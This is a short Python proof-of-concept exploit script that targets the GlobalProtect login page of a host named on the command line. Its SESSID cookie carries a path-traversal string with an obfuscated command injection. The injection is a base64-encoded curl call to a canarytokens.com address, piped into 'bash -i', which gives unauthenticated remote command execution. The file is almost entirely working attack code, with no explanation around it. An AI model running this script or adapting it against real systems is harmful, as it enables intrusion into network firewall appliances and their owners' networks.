import requests
import sys

def main():
    if len(sys.argv) != 2:
        print("Usage: python Poc.py <host>")
        sys.exit(1)
    
    host = sys.argv[1]
    url = f'https://{host}/global-protect/login.esp'

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    }

    cookies = {
        'SESSID': '../../../../opt/panlogs/tmp/device_telemetry/minute/`echo${IFS}Y3VybCBrZ2UzZHI0ZmFmdGF2YWw1NXk4dDJ3OXVwLmNhbmFyeXRva2Vucy5jb20=|base64${IFS}-d|bash${IFS}-i`'
    }

    response = requests.get(url, headers=headers, cookies=cookies)
    print(response.text)

if __name__ == "__main__":
    main()
